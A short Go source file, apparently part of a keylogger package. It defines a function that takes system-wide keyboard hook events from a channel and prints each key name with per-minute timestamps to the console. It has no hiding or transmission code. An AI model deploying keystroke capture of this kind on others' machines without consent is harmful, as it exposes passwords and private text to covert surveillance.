package keylogger

import (
	"fmt"
	"time"

	"github.com/moutend/go-hook/pkg/types"
)

func RawKeyLogger(keyboardChan chan types.KeyboardEvent) {
	var key types.KeyboardEvent

	var lastTime time.Time
	var now time.Time

	name := ""
	direction := ""

	for {
		key = <-keyboardChan

		name = key.VKCode.String()[3:]

		now = time.Now()
		if lastTime.Unix()/60 != now.Unix()/60 {
			lastTime = now.Truncate(time.Minute)
			fmt.Printf("\n%s ", lastTime.Format(time.RFC3339)[:16])
		}

		direction = "."
		if key.Message == types.WM_KEYUP {
			direction = ""
		}

		fmt.Printf(" %s%s", direction, name)

		lastTime = now
	}
}
